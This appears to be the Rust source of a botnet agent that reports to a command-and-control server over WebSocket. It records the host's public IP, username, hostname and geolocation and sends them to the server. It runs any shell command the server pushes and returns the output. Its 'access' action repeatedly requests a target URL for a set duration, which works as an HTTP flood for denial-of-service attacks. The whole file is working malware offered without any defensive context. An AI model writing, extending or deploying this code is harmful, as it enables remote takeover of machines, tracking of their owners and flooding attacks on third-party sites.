use std::time::Duration;

use crate::handlers::models::{Agent as C2Agent, C2Message, Location};
use futures::prelude::*;
use hostname::get as hostname;
use reqwest::Client;
use serde_json::Value;
use tokio::process::Command;
use tokio_tungstenite::tungstenite::Message;
use tokio_tungstenite::{MaybeTlsStream, WebSocketStream};
use uuid::Uuid;

pub struct Agent {
    uuid: String,
    ws: WebSocketStream<MaybeTlsStream<tokio::net::TcpStream>>,
    client: Client,
}

impl Agent {
    pub async fn new() -> Result<Self, Box<dyn std::error::Error>> {
        let mut uuid = String::new();
        let config_dir = match dirs::home_dir() {
            Some(path) => path.join(".unique_id"),
            None => {
                uuid = Uuid::new_v4().to_string();
                eprintln!(
                    "Could not find home directory. Generating random UUID: {}",
                    uuid
                );
                return Err("Could not find home directory".into());
            }
        };

        if !config_dir.exists() {
            uuid = Uuid::new_v4().to_string();
            std::fs::write(&config_dir, &uuid)?;
            eprintln!("Generated and saved new UUID: {}", uuid);
        } else {
            uuid = std::fs::read_to_string(&config_dir)?;
            eprintln!("Loaded UUID from file: {}", uuid);
        }

        let client = Client::builder().timeout(Duration::from_secs(10)).build()?;
        let (ws, _) = tokio_tungstenite::connect_async("ws://localhost:80/c2").await?;
        Ok(Agent { uuid, ws, client })
    }

    pub async fn run(&mut self) -> Result<(), Box<dyn std::error::Error>> {
        let ip = self
            .client
            .get("https://api.ipify.org/")
            .send()
            .await?
            .text()
            .await?;

        let username = whoami::username();

        let hostname = hostname()?.to_string_lossy().to_string();

        let location_response = self
            .client
            .get(format!("https://freeipapi.com/api/json/{}", ip))
            .send()
            .await?
            .text()
            .await?;

        let location_json: Value = serde_json::from_str(&location_response)?;
        let location = Location {
            country: location_json["countryName"]
                .as_str()
                .unwrap_or("Unknown")
                .to_string(),
            city: location_json["cityName"]
                .as_str()
                .unwrap_or("Unknown")
                .to_string(),
            region: location_json["regionName"]
                .as_str()
                .unwrap_or("Unknown")
                .to_string(),
            latitude: location_json["latitude"].as_f64().unwrap_or(0.0),
            longitude: location_json["longitude"].as_f64().unwrap_or(0.0),
        };

        // Enviar registro para o servidor via WebSocket
        let register_msg = serde_json::to_string(&C2Message::AgentRegister {
            uuid: self.uuid.clone(),
            ip,
            username,
            hostname,
            country: location.country,
            city: location.city,
            region: location.region,
            latitude: location.latitude,
            longitude: location.longitude,
        })?;
        eprintln!(
            "Agent {} sending register message: {}",
            self.uuid, register_msg
        );
        self.ws.send(Message::text(&register_msg)).await?;

        // Processar mensagens do servidor
        while let Some(msg) = self.ws.next().await {
            if let Ok(msg) = msg {
                if let Ok(text) = msg.into_text() {
                    if let Ok(c2_msg) = serde_json::from_str::<C2Message>(&text) {
                        match c2_msg {
                            C2Message::Ping => {
                                self.ws
                                    .send(Message::text(serde_json::to_string(&C2Message::Pong)?))
                                    .await?;
                            }
                            C2Message::Command { uuid, cmd } => {
                                if uuid == self.uuid {
                                    eprintln!("Agent {} received Command: {}", self.uuid, cmd);
                                    if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
                                        if json["action"] == "access" {
                                            let url = json["url"].as_str().unwrap_or("");
                                            let secs = json["duration_secs"].as_u64().unwrap_or(0);
                                            let end_time = std::time::Instant::now()
                                                + Duration::from_secs(secs);
                                            while std::time::Instant::now() < end_time {
                                                let output = match self.client.get(url).send().await
                                                {
                                                    Ok(resp) => {
                                                        resp.text().await.unwrap_or_else(|e| {
                                                            format!(
                                                                "Error on receiving response: {}",
                                                                e
                                                            )
                                                        })
                                                    }
                                                    Err(e) => {
                                                        format!("Error on sending request: {}", e)
                                                    }
                                                };
                                            }
                                        } else {
                                            Command::new("sh").arg("-c").arg(&cmd).output().await?;
                                        }
                                    }
                                }
                            }
                            C2Message::Broadcast { cmd } => {
                                eprintln!("Agent {} received Broadcast: {}", self.uuid, cmd);
                                if let Ok(json) = serde_json::from_str::<Value>(&cmd) {
                                    if json["action"] == "access" {
                                        let url = json["url"].as_str().unwrap_or_default();
                                        let secs = json["duration_secs"].as_u64().unwrap_or(0);
                                        let end_time =
                                            std::time::Instant::now() + Duration::from_secs(secs);
                                        while std::time::Instant::now() < end_time {
                                            let output = match self.client.get(url).send().await {
                                                Ok(resp) => resp.text().await.unwrap_or_else(|e| {
                                                    format!("Error on receiving response: {}", e)
                                                }),
                                                Err(e) => {
                                                    format!("Error on sending request: {}", e)
                                                }
                                            };

                                            self.ws
                                                .send(Message::text(serde_json::to_string(
                                                    &C2Message::CommandResponse { output },
                                                )?))
                                                .await?;
                                            tokio::time::sleep(Duration::from_millis(100)).await;
                                        }
                                    } else {
                                        let output: std::process::Output =
                                            Command::new("sh").arg("-c").arg(&cmd).output().await?;
                                        let output =
                                            String::from_utf8_lossy(&output.stdout).to_string();

                                        self.ws
                                            .send(Message::text(serde_json::to_string(
                                                &C2Message::CommandResponse { output },
                                            )?))
                                            .await?;
                                    }
                                }
                            }
                            _ => {}
                        }
                    }
                }
            }
        }
        Ok(())
    }
}
